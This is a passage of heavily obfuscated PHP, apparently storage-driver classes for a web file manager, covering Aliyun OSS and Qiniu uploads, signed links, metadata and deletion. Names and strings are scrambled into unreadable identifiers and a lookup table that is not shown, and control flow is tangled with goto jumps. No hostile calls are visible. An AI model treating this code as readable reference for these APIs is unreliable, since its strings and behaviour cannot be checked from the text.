dè³ğß„„; BÎõã§®‡Ÿ: } private function chmodPath($Aß°ÔèÁÔ…, $f…ö¿šÊ™Å = '') { $b®Ğ„¯³šÌ =& $_SERVER[÷ÖêïÔÔÓ]; $fÎæ¨Šª¼ä = empty($f…ö¿šÊ™Å) ? $b®Ğ„¯³šÌ[1155] : $f…ö¿šÊ™Å; $EµÔ’Û¢¢ = array($b®Ğ„¯³šÌ[34], $b®Ğ„¯³šÌ[182], $b®Ğ„¯³šÌ[1154], $b®Ğ„¯³šÌ[1155]); if (!in_array($fÎæ¨Šª¼ä, $EµÔ’Û¢¢)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $Aß°ÔèÁÔ…, $fÎæ¨Šª¼ä); } catch (OSS\Core\OssException $A°‘İ ‰Ù) { return !1; } return !0; } public function getContent($b¯±òÅïŸ×) { return $this->fileSubstr($b¯±òÅïŸ×, -1); } public function setContent($FèÔñ‰ä™Û, $bô„ÛÒ‘íß = '') { $aˆãî›‹Ó =& $_SERVER[÷ÖêïÔÔÓ]; try { $Eˆ¦ç½«© = $this->trafficLimit($aˆãî›‹Ó[1156]); $F°¼èßÀó = $this->client->putObject($this->bucket, $FèÔñ‰ä™Û, $bô„ÛÒ‘íß, $Eˆ¦ç½«©); } catch (OSS\Core\OssException $E„®°¿…ÄÓ) { return !1; } $b—«³¼Èå = array($aˆãî›‹Ó[1143] => trim($F°¼èßÀó[$aˆãî›‹Ó[1157]], $aˆãî›‹Ó[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($FèÔñ‰ä™Û))); $this->updateObjMeta($FèÔñ‰ä™Û, $b—«³¼Èå); return isset($F°¼èßÀó[$aˆãî›‹Ó[1158]][$aˆãî›‹Ó[1104]]) ? (int) $F°¼èßÀó[$aˆãî›‹Ó[1158]][$aˆãî›‹Ó[1104]] : strlen($F°¼èßÀó); } private function updateObjMeta($CïÛ¦ãÙ§, $A°Â¦£•³¿) { try { $e„©‡±‘ˆÏ = array(OSS\OssClient::OSS_HEADERS => $A°Â¦£•³¿); $this->client->copyObject($this->bucket, $CïÛ¦ãÙ§, $this->bucket, $CïÛ¦ãÙ§, $e„©‡±‘ˆÏ); } catch (OSS\Core\OssException $a’İ´Éö¥ò) { return !1; } return !0; } public function upload($FœÔãíµÑ, $C»œ¯„î¶, $bÕ¡Ù°Óè = false, $CÆ·Ñ¸ó¸ = REPEAT_REPLACE) { $d‹°³ÓêÖ =& $_SERVER[÷ÖêïÔÔÓ]; $b¾‘é¤½Â½ = trim($FœÔãíµÑ, $d‹°³ÓêÖ[8]); $aØ‰ñó‹²Ö = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($d‹°³ÓêÖ[1143] => @md5_file($C»œ¯„î¶)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($FœÔãíµÑ))); $aØ‰ñó‹²Ö = $this->trafficLimit($d‹°³ÓêÖ[1156], $aØ‰ñó‹²Ö); try { $this->client->multiuploadFile($this->bucket, $b¾‘é¤½Â½, $C»œ¯„î¶, $aØ‰ñó‹²Ö); } catch (OSS\Core\OssException $aí‡œÆ„ã) { return !1; } return $this->getPathOuter($FœÔãíµÑ); } public function getHost() { $bÄõ¬ãæ¬ =& $_SERVER[÷ÖêïÔÔÓ]; $bÎ†İâñ¿ˆ = explode($bÄõ¬ãæ¬[168], parent::getHost()); return $bÎ†İâñ¿ˆ[0] . $bÄõ¬ãæ¬[168] . $this->bucket . $bÄõ¬ãæ¬[92] . $bÎ†İâñ¿ˆ[1]; } public function uploadFormData($eºì ‡¢«, $FÌ“õˆ¦‰£ = 3600) { goto D®Øï‹ÓîÅ; aÊ¦Š¨Ğ: $e·¸Ş„„ = strpos($b‹¬Áå­», $bº²˜…øˆ[281]); $b‹¬Áå­» = substr($b‹¬Áå­», 0, $e·¸Ş„„) . $bº²˜…øˆ[1160]; $e¼´‹™Î±­ = 1048576000 * 5; goto AÇ‹´‘ŞÌ; AÊç¯¬Ú¦: $DÊà÷îñğğ = base64_encode(hash_hmac($bº²˜…øˆ[215], $cÁ‰ÁÁëÛ, $this->secret, !0)); $d…ºäµ‘‹Ş = array($bº²˜…øˆ[1074] => $cÁ‰ÁÁëÛ, $bº²˜…øˆ[1162] => $this->accessKey, $bº²˜…øˆ[1070] => $bº²˜…øˆ[1062], $bº²˜…øˆ[1163] => $DÊà÷îñğğ, $bº²˜…øˆ[166] => $dœéÍ¸ª²Â); $d…ºäµ‘‹Ş = $this->trafficLimit($bº²˜…øˆ[1156], $d…ºäµ‘‹Ş); goto CÒ‡¤Ãİ¤; CÒ‡¤Ãİ¤: return $d…ºäµ‘‹Ş; goto BßÙ‚ÃÛÁ; AÇ‹´‘ŞÌ: $cß¼à‡ôó = $this->pathFather($eºì ‡¢«); $DÃÍé¡ğ¹ = array($bº²˜…øˆ[1064] => $b‹¬Áå­», $bº²˜…øˆ[1065] => array(array($bº²˜…øˆ[1161], 0, $e¼´‹™Î±­), array($bº²˜…øˆ[1068], $bº²˜…øˆ[1069], $cß¼à‡ôó))); $cÁ‰ÁÁëÛ = base64_encode(json_encode($DÃÍé¡ğ¹)); goto AÊç¯¬Ú¦; D®Øï‹ÓîÅ: $bº²˜…øˆ =& $_SERVER[÷ÖêïÔÔÓ]; if (!($dœéÍ¸ª²Â = $this->getHost())) { return !1; } $cåñ¬Ï¡ˆ¨ = $FÌ“õˆ¦‰£; goto D±ß–ÊêÏ¢; D±ß–ÊêÏ¢: $B¶†¾Ïµè = date($bº²˜…øˆ[1159], time() + $cåñ¬Ï¡ˆ¨); $d“‹„§§›› = new DateTime($B¶†¾Ïµè); $b‹¬Áå­» = $d“‹„§§››->format(DateTime::ISO8601); goto aÊ¦Š¨Ğ; BßÙ‚ÃÛÁ: } public function multiUploadFormData($E²…õÔù½², $cé­ ‹ÀŠÌ = 3600) { $BË¦éø®… =& $_SERVER[÷ÖêïÔÔÓ]; if (!($A”ˆ¦ÓÕ¤ = $this->getHost())) { return !1; } $DŸˆÙº§Èö = $this->trafficLimit($BË¦éø®…[1156]); $DàÁå§óˆ = $this->client->initiateMultipartUpload($this->bucket, $E²…õÔù½², $DŸˆÙº§Èö); return array($BË¦éø®…[206] => $DàÁå§óˆ, $BË¦éø®…[166] => $A”ˆ¦ÓÕ¤ . $BË¦éø®…[8] . $this->pathEncode($E²…õÔù½²), $BË¦éø®…[207] => gmdate($BË¦éø®…[1164]), $BË¦éø®…[88] => $E²…õÔù½²); } public function multiUploadAuthData($Fä°ÛË‚„, $EÂ¿±™î§ô = array()) { goto bÒ½¯£Ñ«Ú; Aº„³®ÚÇª: if (!empty($EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[1166]])) { $bø¥èà£Îƒ = array_merge(array($c¬ôÄºØà[4]), $EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[1166]]); sort($bø¥èà£Îƒ); $c¬ôÄºØà[4] = implode($Dù¢„ª®ÔÅ[214], $bø¥èà£Îƒ); } $eÉƒÓ«•ñ = implode($Dù¢„ª®ÔÅ[214], $c¬ôÄºØà); $AØºĞ…³ïÈ = base64_encode(hash_hmac($Dù¢„ª®ÔÅ[215], $eÉƒÓ«•ñ, $this->secret, !0)); goto BÏÃáµôò; Cğ¦í‚–Ñ: $c¬ôÄºØà = array($Dù¢„ª®ÔÅ[209], $Dù¢„ª®ÔÅ[33], $Dù¢„ª®ÔÅ[115], $Fç•ê©­Ãç, "\x78\x2d\157\x73\x73\x2d\x64\141\x74\x65\x3a{$Fç•ê©­Ãç}", $Dù¢„ª®ÔÅ[8] . $this->bucket . $Dù¢„ª®ÔÅ[8] . $cª®‘Æ„·½ . $c¤é°›ìÎ³); if (strpos($c¤é°›ìÎ³, $Dù¢„ª®ÔÅ[210]) === 0) { $c¬ôÄºØà[0] = $Dù¢„ª®ÔÅ[211]; if ($BŸÕ¡Î¢›¤ = $this->trafficLimit($Dù¢„ª®ÔÅ[1156])) { $cª®‘Æ„·½ = $Dù¢„ª®ÔÅ[1165]; array_splice($c¬ôÄºØà, 5, 0, $cª®‘Æ„·½ . $Dù¢„ª®ÔÅ[4] . $BŸÕ¡Î¢›¤[$cª®‘Æ„·½]); } } if (isset($EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[212]]) && $EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[212]] == $Dù¢„ª®ÔÅ[213]) { $c¬ôÄºØà[0] = $Dù¢„ª®ÔÅ[213]; } goto Aº„³®ÚÇª; BÏÃáµôò: $B÷‰é—ğ‰  = $Dù¢„ª®ÔÅ[1167] . $this->accessKey . $Dù¢„ª®ÔÅ[4] . $AØºĞ…³ïÈ; if (strpos($c¤é°›ìÎ³, $Dù¢„ª®ÔÅ[210]) === 0) { $B÷‰é—ğ‰  = array($Dù¢„ª®ÔÅ[217] => $B÷‰é—ğ‰ , $Dù¢„ª®ÔÅ[207] => $Fç•ê©­Ãç); if ($BŸÕ¡Î¢›¤) { $B÷‰é—ğ‰  = array_merge($B÷‰é—ğ‰ , $BŸÕ¡Î¢›¤); } } return $B÷‰é—ğ‰ ; goto dÎ¡‰åÁİ¯; eË¯Íğ¾õÄ: $cª®‘Æ„·½ = $Fä°ÛË‚„; if (isset($EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[88]])) { $cª®‘Æ„·½ = $EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[88]]; unset($EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[88]]); } if (isset($EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[208]])) { return $this->listUploadParts($cª®‘Æ„·½, $Fç•ê©­Ãç, $EÂ¿±™î§ô); } goto Cğ¦í‚–Ñ; bÒ½¯£Ñ«Ú: $Dù¢„ª®ÔÅ =& $_SERVER[÷ÖêïÔÔÓ]; $Fç•ê©­Ãç = isset($EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[207]]) ? $EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[207]] : gmdate($Dù¢„ª®ÔÅ[1164]); $c¤é°›ìÎ³ = isset($EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[157]]) ? $EÂ¿±™î§ô[$Dù¢„ª®ÔÅ[157]] : $Dù¢„ª®ÔÅ[33]; goto eË¯Íğ¾õÄ; dÎ¡‰åÁİ¯: } public function listUploadParts($eŒ­òí¸¡§, $FËÃÃ¼Ş, $E¨²ˆƒ’¶Ş) { goto e®«Œ«µÇ; dç³÷Ã„Š: unset($E¨²ˆƒ’¶Ş[$DÍìœ±œÃ[208]], $E¨²ˆƒ’¶Ş[$DÍìœ±œÃ[212]]); $F£…§Õì·¢ = $this->multiUploadAuthData($eŒ­òí¸¡§, $E¨²ˆƒ’¶Ş); if (empty($F£…§Õì·¢)) { return !1; } goto bªŸŠ©¿õÍ; b¦ÛÓÌÍ¨¯: $cÖ¤»£á£ˆ = $bÚ†«îˆçÔ->getListPart(); $DÒªÌì†ğ¨ = array(); foreach ($cÖ¤»£á£ˆ as $D‚¯Æªº¿¹) { $DÒªÌì†ğ¨[] = array($DÍìœ±œÃ[1147] => $D‚¯Æªº¿¹->getPartNumber(), $DÍìœ±œÃ[1148] => trim($D‚¯Æªº¿¹->getETag(), $DÍìœ±œÃ[112])); } goto dç³÷Ã„Š; bªŸŠ©¿õÍ: return array($DÍìœ±œÃ[217] => $F£…§Õì·¢, $DÍìœ±œÃ[207] => $FËÃÃ¼Ş, $DÍìœ±œÃ[219] => $DÒªÌì†ğ¨); goto bÎòÆ×Å§ˆ; e®«Œ«µÇ: $DÍìœ±œÃ =& $_SERVER[÷ÖêïÔÔÓ]; $AÔ¶Âìøã‚ = parse_url_query($E¨²ˆƒ’¶Ş[$DÍìœ±œÃ[157]]); $bÚ†«îˆçÔ = $this->client->listParts($this->bucket, $eŒ­òí¸¡§, $AÔ¶Âìøã‚[$DÍìœ±œÃ[206]]); goto b¦ÛÓÌÍ¨¯; bÎòÆ×Å§ˆ: } public function download($B’ªªŸ¡Òö, $b«šÊìÛ) { if ($this->isFolder($B’ªªŸ¡Òö)) { return !1; } try { $FñÚµ´ß¿ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $b«šÊìÛ); $FñÚµ´ß¿ = $this->trafficLimit($_SERVER[÷ÖêïÔÔÓ][104], $FñÚµ´ß¿); $this->client->getObject($this->bucket, $B’ªªŸ¡Òö, $FñÚµ´ß¿); } catch (OSS\Core\OssException $c¡Éø‚ö…Ó) { return !1; } return $b«šÊìÛ; } public function fileSubstr($C‰ÑëÒØèª, $fœ»‡ƒ…÷Å = 0, $f·ÈÊëˆìø = false) { if ($fœ»‡ƒ…÷Å === -1) { $AÚÏ©¦Ş† = array(); } else { if ($f·ÈÊëˆìø === !1) { $A½˜àÎ“ØÕ = $this->size($C‰ÑëÒØèª); } else { $A½˜àÎ“ØÕ = $fœ»‡ƒ…÷Å + $f·ÈÊëˆìø - 1; } $AÚÏ©¦Ş† = array(OSS\OssClient::OSS_RANGE => "{$fœ»‡ƒ…÷Å}\55{$A½˜àÎ“ØÕ}"); } try { return $this->client->getObject($this->bucket, $C‰ÑëÒØèª, $AÚÏ©¦Ş†); } catch (OSS\Core\OssException $bÔ¿ùËŠ‡ˆ) { return !1; } } private function trafficLimit($eÎĞ¿ŒŞ’ò, $fäà‹µŸÊ = array()) { goto bÑ¼ß¤Ë‡¦; f´¦Æ½ë‰¸: return $fäà‹µŸÊ; goto cÜ—ŒÒìĞ¦; bÑ¼ß¤Ë‡¦: $dñãˆïÎä” =& $_SERVER[÷ÖêïÔÔÓ]; if ($eÎĞ¿ŒŞ’ò == $dñãˆïÎä”[1156] && $GLOBALS[$dñãˆïÎä”[6]][$dñãˆïÎä”[84]][$dñãˆïÎä”[85]] || $eÎĞ¿ŒŞ’ò == $dñãˆïÎä”[104] && $GLOBALS[$dñãˆïÎä”[6]][$dñãˆïÎä”[84]][$dñãˆïÎä”[978]]) { return $fäà‹µŸÊ; } $A¸¿ƒ¿Ù’Ç = floatval($GLOBALS[$dñãˆïÎä”[6]][$dñãˆïÎä”[84]][$dñãˆïÎä”[90]][$eÎĞ¿ŒŞ’ò]) * 1024 * 1024 * 8; goto F…è‡ÑË‹Ï; F…è‡ÑË‹Ï: if (!$A¸¿ƒ¿Ù’Ç) { return $fäà‹µŸÊ; } $A¸¿ƒ¿Ù’Ç = $A¸¿ƒ¿Ù’Ç < 819200 ? 819200 : ($A¸¿ƒ¿Ù’Ç > 838860800 ? 838860800 : $A¸¿ƒ¿Ù’Ç); $fäà‹µŸÊ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A¸¿ƒ¿Ù’Ç); goto f´¦Æ½ë‰¸; cÜ—ŒÒìĞ¦: } public function link($b¿¦ğ«º , $a¸˜…Õ•Î = array()) { $cà’šÑ…»Í =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->exist($b¿¦ğ«º ) || $this->isFolder($b¿¦ğ«º )) { return !1; } try { $a¸˜…Õ•Î = $this->trafficLimit($cà’šÑ…»Í[104], $a¸˜…Õ•Î); $bà¤¬Óíø = $this->client->signUrl($this->bucket, $b¿¦ğ«º , 3600 * 12, $cà’šÑ…»Í[213], $a¸˜…Õ•Î); return $bà¤¬Óíø; } catch (OSS\Core\OssException $eè¾Ò…Š) { return !1; } } public function fileOut($d¨¡ùçê“è, $DÜêÈÖÍù = false, $F¸ç¨ï ‰ò = false, $Bğƒ÷Ÿ½’‘ = '') { goto c”¬œƒ™õ; D•¾¢óÕ‹Ş: $a­ô–†„[OSS\OssClient::OSS_SUB_RESOURCE] .= $C•Êæ¥©²[1169] . $D«—®¸Æ; $dä¶È„çø£ = $this->link($d¨¡ùçê“è, $a­ô–†„); $this->fileOutLink($dä¶È„çø£); goto fÅ£›±ƒÙ•; bä…®ŒğÆ•: if ($D«—®¸Æ == $C•Êæ¥©²[198]) { return parent::fileOut($d¨¡ùçê“è, $DÜêÈÖÍù, $F¸ç¨ï ‰ò, $Bğƒ÷Ÿ½’‘); } $DÜêÈÖÍù = $DÜêÈÖÍù ? $C•Êæ¥©²[199] : $C•Êæ¥©²[200]; $a­ô–†„ = array(OSS\OssClient::OSS_SUB_RESOURCE => $C•Êæ¥©²[1168] . rawurlencode("{$DÜêÈÖÍù}\x3b\x66\x69\x6c\145\156\141\155\145\x3d{$F¸ç¨ï ‰ò}")); goto D•¾¢óÕ‹Ş; c”¬œƒ™õ: $C•Êæ¥©² =& $_SERVER[÷ÖêïÔÔÓ]; if (!$F¸ç¨ï ‰ò) { $F¸ç¨ï ‰ò = $this->pathThis($d¨¡ùçê“è); } $D«—®¸Æ = get_file_mime(get_path_ext($F¸ç¨ï ‰ò)); goto bä…®ŒğÆ•; fÅ£›±ƒÙ•: } public function fileOutServer($a÷Áññáäƒ, $c®’Ã¶ö†‡ = false, $A‡íàØ¦« = false, $Dê˜ä› Äˆ = '') { parent::fileOut($a÷Áññáäƒ, $c®’Ã¶ö†‡, $A‡íàØ¦«, $Dê˜ä› Äˆ); } public function fileOutImage($bŒ¥’Œ…’ğ, $e¡‚†¤Ú = 250) { $c‹‰ñ£¡åî = array(OSS\OssClient::OSS_PROCESS => $_SERVER[÷ÖêïÔÔÓ][1170] . $e¡‚†¤Ú); $Bğ º×Éìç = $this->link($bŒ¥’Œ…’ğ, $c‹‰ñ£¡åî); $this->fileOutLink($Bğ º×Éìç); } public function fileOutImageServer($b¥”¬¶ãš, $e£ìé¨ù ™ = 250) { parent::fileOutImage($b¥”¬¶ãš, $e£ìé¨ù ™); } public function hashMd5($CõÆ‚ƒ‡¶ä, $b „‚ËÑöÌ = '') { $F£¸ì„¡³ë =& $_SERVER[÷ÖêïÔÔÓ]; $Aù¯Ó¡Ş¹Ù = $this->objectMeta($CõÆ‚ƒ‡¶ä); if (!$Aù¯Ó¡Ş¹Ù) { return $F£¸ì„¡³ë[33]; } if (!isset($Aù¯Ó¡Ş¹Ù[$F£¸ì„¡³ë[1143]]) && !empty($b „‚ËÑöÌ)) { $BŠ¤ëŒ¤ß£ = $this->updateObjMeta($CõÆ‚ƒ‡¶ä, array($F£¸ì„¡³ë[1143] => $b „‚ËÑöÌ)); $Aù¯Ó¡Ş¹Ù[$F£¸ì„¡³ë[1143]] = $BŠ¤ëŒ¤ß£ ? $b „‚ËÑöÌ : $F£¸ì„¡³ë[33]; } return isset($Aù¯Ó¡Ş¹Ù[$F£¸ì„¡³ë[1143]]) ? strtolower($Aù¯Ó¡Ş¹Ù[$F£¸ì„¡³ë[1143]]) : $F£¸ì„¡³ë[33]; } public function size($B‰Î‚Œï¶œ) { $D–æÚİÓÕ• = $this->objectMeta($B‰Î‚Œï¶œ); return $D–æÚİÓÕ• ? $D–æÚİÓÕ•[$_SERVER[÷ÖêïÔÔÓ][78]] : 0; } public function info($eõòÜº‡Ü¶) { if ($this->isFolder($eõòÜº‡Ü¶)) { return $this->folderInfo($eõòÜº‡Ü¶); } else { if ($this->isFile($eõòÜº‡Ü¶)) { return $this->fileInfo($eõòÜº‡Ü¶); } } return !1; } public function exist($E´è¼Ø¶Â‰) { return $this->isFile($E´è¼Ø¶Â‰) || $this->isFolder($E´è¼Ø¶Â‰); } public function isFile($CßŸÄê£) { return !$this->isFolder($CßŸÄê£) && $this->objectMeta($CßŸÄê£); } public function isFolder($e«Ï¬°Ø²â) { return $this->cacheMehod($_SERVER[÷ÖêïÔÔÓ][220], $e«Ï¬°Ø²â); } protected function objectMeta($F°ªâÚÑ’Ô) { return $this->cacheMehod($_SERVER[÷ÖêïÔÔÓ][221], $F°ªâÚÑ’Ô); } protected function _objectMeta($d’ˆùÈÚÑî) { $EáˆÚÕò´ª =& $_SERVER[÷ÖêïÔÔÓ]; try { $DÂ¬¸´Šé† = $this->client->getObjectMeta($this->bucket, $d’ˆùÈÚÑî); } catch (OSS\Core\OssException $bÚÇœ’Úô) { $DÂ¬¸´Šé† = !1; } if ($DÂ¬¸´Šé†) { $DÂ¬¸´Šé†[$EáˆÚÕò´ª[78]] = intval($DÂ¬¸´Šé†[$EáˆÚÕò´ª[1150]]); } return $DÂ¬¸´Šé†; } protected function _isFolder($e‡Ø•äß) { $Cƒ…Ø®¿Ê =& $_SERVER[÷ÖêïÔÔÓ]; $d°§…¢÷‹‡ = array($Cƒ…Ø®¿Ê[1140] => $Cƒ…Ø®¿Ê[8], $Cƒ…Ø®¿Ê[183] => trim($e‡Ø•äß, $Cƒ…Ø®¿Ê[8]) . $Cƒ…Ø®¿Ê[8], $Cƒ…Ø®¿Ê[1141] => 1, $Cƒ…Ø®¿Ê[1142] => $Cƒ…Ø®¿Ê[33]); $A¬Œ£„½„¦ = $this->client->listObjects($this->bucket, $d°§…¢÷‹‡); if ($A¬Œ£„½„¦->getObjectList() || $A¬Œ£„½„¦->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public function __construct($càïñ¥³¹) { parent::__construct(); require_once SDK_DIR . $_SERVER[÷ÖêïÔÔÓ][1171]; $this->_init($càïñ¥³¹); } public function _init($cÓ§ë–¼¥„) { foreach ($cÓ§ë–¼¥„ as $DŞ¨ê¥ÜÍ => $aŞ¸ì°³ÕŞ) { if (isset($this->{$DŞ¨ê¥ÜÍ})) { $this->{$DŞ¨ê¥ÜÍ} = $aŞ¸ì°³ÕŞ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[÷ÖêïÔÔÓ][1172], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($b—‘âìöÅ, $fç¥¬ÏÙÕº = '', $fåí‚áË¿ = REPEAT_RENAME) { if ($this->setContent($b—‘âìöÅ, $fç¥¬ÏÙÕº)) { return $this->getPathOuter($b—‘âìöÅ); } return !1; } public function mkdir($D§À¹¾¤ÒÌ, $cÌ½Î·…ø£ = REPEAT_SKIP) { goto BáŒ¨Î¿ä†; F×õº¶»·É: $D§À¹¾¤ÒÌ = $F£…÷†ˆÛ¢ . $FöĞœ–‘«—[8]; $e¥ñö®¥¤º = get_path_this($F£…÷†ˆÛ¢); $CÙˆ§–‹ = $D§À¹¾¤ÒÌ . $e¥ñö®¥¤º; goto cŒÂô¡¿à; cŒÂô¡¿à: if (!$this->mkfile($CÙˆ§–‹)) { return !1; } if (!$this->moveFile($CÙˆ§–‹, $D§À¹¾¤ÒÌ)) { $this->delFile($CÙˆ§–‹); return !1; } return $this->getPathOuter($F£…÷†ˆÛ¢); goto aó™¢¦²ùô; BáŒ¨Î¿ä†: $FöĞœ–‘«— =& $_SERVER[÷ÖêïÔÔÓ]; $F£…÷†ˆÛ¢ = trim($D§À¹¾¤ÒÌ, $FöĞœ–‘«—[8]); if ($this->_isFolder($F£…÷†ˆÛ¢)) { return $this->getPathOuter($F£…÷†ˆÛ¢); } goto F×õº¶»·É; aó™¢¦²ùô: } public function copyFile($B³–Ùö‚Øå, $a’„Ä‰Œç“) { $B¸£µ£œ·³ = $this->bucketManager->copy($this->bucket, $B³–Ùö‚Øå, $this->bucket, $a’„Ä‰Œç“, !0); return $B¸£µ£œ·³ ? !1 : !0; } public function moveFile($CÈò‡‰Œìö, $aÁŒÜÍšÌ¼) { $Bîä¹—© = $this->bucketManager->move($this->bucket, $CÈò‡‰Œìö, $this->bucket, $aÁŒÜÍšÌ¼, !0); return $Bîä¹—© ? !1 : !0; } public function delFile($E†«ŠµŒ¹¡) { $cÂàíöÇæö = $this->bucketManager->delete($this->bucket, $E†«ŠµŒ¹¡); return $cÂàíöÇæö ? !1 : !0; } public function delFolder($Eä‘•£†è) { $E‚¡òÜ£‡Š = $this->fileList($Eä‘•£†è); if (empty($E‚¡òÜ£‡Š)) { return !0; } $d„——¦Ì = 1000; if (count($E‚¡òÜ£‡Š) <= $d„——¦Ì) { return $this->qnDelObj($E‚¡òÜ£‡Š) ? !1 : !0; } foreach (array_chunk($E‚¡òÜ£‡Š, $d„——¦Ì) as $b‡Ö©Ä‡Ï) { $D‘˜¡î¡¡“ = $this->qnDelObj($b‡Ö©Ä‡Ï); if ($D‘˜¡î¡¡“) { return !1; } } return !0; } private function qnDelObj($cÆªõÎåº•) { $C‘™§‘ŸàÂ = $this->bucketManager->buildBatchDelete($this->bucket, $cÆªõÎåº•); list($Eä‘®š½, $e¿ç¯¡Í¿¡) = $this->bucketManager->batch($C‘™§‘ŸàÂ); return $e¿ç¯¡Í¿¡; } private function fileList($dˆÜ³ŠšÂ, $F²œÂÌê¯ = 0) { goto CÓ¨êê›ˆË; CÓ¨êê›ˆË: $DÈ´©ñ¨­Ï =& $_SERVER[÷ÖêïÔÔÓ]; $dˆÜ³ŠšÂ = trim($dˆÜ³ŠšÂ, $DÈ´©ñ¨­Ï[8]); $fñ¯Ã¿Öß = empty($dˆÜ³ŠšÂ) ? $DÈ´©ñ¨­Ï[33] : $dˆÜ³ŠšÂ . $DÈ´©ñ¨­Ï[8]; goto DÜ“ôŸ„ñ; a‘šÉ½¿¶—: $b±ËäÛœâ = array(); while (!0) { list($c°²êÊ¹Á£, $bŒ‘íƒ¯Ûà) = $this->bucketManager->listFiles($this->bucket, $fñ¯Ã¿Öß, $b¡ÃÁ¶«†, $bËÙˆ‚ì¬¼, $a¸×ïî‰‡Ä); if ($bŒ‘íƒ¯Ûà) { return !1; } $b¡ÃÁ¶«† = array_key_exists($DÈ´©ñ¨­Ï[1142], $c°²êÊ¹Á£) ? $b¡ÃÁ¶«† = $c°²êÊ¹Á£[$DÈ´©ñ¨­Ï[1173]] : $DÈ´©ñ¨­Ï[33]; foreach ($c°²êÊ¹Á£[$DÈ´©ñ¨­Ï[1174]] as $a²‹¼Ì×ßÇ) { $Cğ„¨Ìä© = $a²‹¼Ì×ßÇ[$DÈ´©ñ¨­Ï[88]]; if ($F²œÂÌê¯) { $Cğ„¨Ìä© = array($DÈ´©ñ¨­Ï[28] => $Cğ„¨Ìä©, $DÈ´©ñ¨­Ï[78] => $a²‹¼Ì×ßÇ[$DÈ´©ñ¨­Ï[1175]]); } $b±ËäÛœâ[] = $Cğ„¨Ìä©; } if ($b¡ÃÁ¶«† == $DÈ´©ñ¨­Ï[33]) { break; } } return $b±ËäÛœâ; goto aÏ•ÔŠÊÆÌ; DÜ“ôŸ„ñ: $b¡ÃÁ¶«† = $DÈ´©ñ¨­Ï[33]; $bËÙˆ‚ì¬¼ = 1000; $a¸×ïî‰‡Ä = $DÈ´©ñ¨­Ï[33]; goto a‘šÉ½¿¶—; aÏ•ÔŠÊÆÌ: } public function rename($eõøõŒ„·Ñ, $FòŒÊÓÏ»ì) { return $this->renameObject($eõøõŒ„·Ñ, $FòŒÊÓÏ»ì); } public function fileInfo($FÒ‰îçÊÉ, $EñÌƒÕ„³¢ = false, $FÓ»è™ = array()) { goto E²ÜÃ‘·­Ù; fµ‰ñä¿Ùæ: if (empty($FÓ»è™)) { $FÓ»è™ = $this->objectMeta($FÒ‰îçÊÉ); if (!$FÓ»è™) { return $A—ğØ¾ª; } } if (isset($FÓ»è™[$Eöô¼Ş©ˆá[1176]])) { $A—ğØ¾ª[$Eöô¼Ş©ˆá[184]] = $FÓ»è™[$Eöô¼Ş©ˆá[1176]]; } if (isset($FÓ»è™[$Eöô¼Ş©ˆá[1175]])) { $A—ğØ¾ª[$Eöô¼Ş©ˆá[78]] = $FÓ»è™[$Eöô¼Ş©ˆá[1175]]; } goto bâ³¼ÒôÀö; E²ÜÃ‘·­Ù: $Eöô¼Ş©ˆá =& $_SERVER[÷ÖêïÔÔÓ]; if ($EñÌƒÕ„³¢) { return array($Eöô¼Ş©ˆá[28] => $this->pathThis($FÒ‰îçÊÉ), $Eöô¼Ş©ˆá[76] => $this->getPathOuter($Eöô¼Ş©ˆá[8] . $FÒ‰îçÊÉ), $Eöô¼Ş©ˆá[29] => $Eöô¼Ş©ˆá[164], $Eöô¼Ş©ˆá[78] => isset($FÓ»è™[$Eöô¼Ş©ˆá[1175]]) ? $FÓ»è™[$Eöô¼Ş©ˆá[1175]] : 0, $Eöô¼Ş©ˆá[157] => $this->ext($FÒ‰îçÊÉ)); } $A—ğØ¾ª = array($Eöô¼Ş©ˆá[28] => $this->pathThis($FÒ‰îçÊÉ), $Eöô¼Ş©ˆá[76] => $this->getPathOuter($Eöô¼Ş©ˆá[8] . $FÒ‰îçÊÉ), $Eöô¼Ş©ˆá[29] => $Eöô¼Ş©ˆá[164], $Eöô¼Ş©ˆá[184] => $Eöô¼Ş©ˆá[50], $Eöô¼Ş©ˆá[106] => $Eöô¼Ş©ˆá[50], $Eöô¼Ş©ˆá[78] => 0, $Eöô¼Ş©ˆá[157] => $this->ext($FÒ‰îçÊÉ), $Eöô¼Ş©ˆá[185] => !0, $Eöô¼Ş©ˆá[186] => !0); goto fµ‰ñä¿Ùæ; bâ³¼ÒôÀö: return $A—ğØ¾ª; goto D¡ôäĞ‚Ì°; D¡ôäĞ‚Ì°: } public function folderInfo($c×Ç­òí¹, $FÚäÒ³¹éº = false) { $BŠØÆÇˆ’Ø =& $_SERVER[÷ÖêïÔÔÓ]; if ($FÚäÒ³¹éº) { return array($BŠØÆÇˆ’Ø[28] => $this->pathThis($c×Ç­òí¹), $BŠØÆÇˆ’Ø[76] => $this->getPathOuter($BŠØÆÇˆ’Ø[8] . 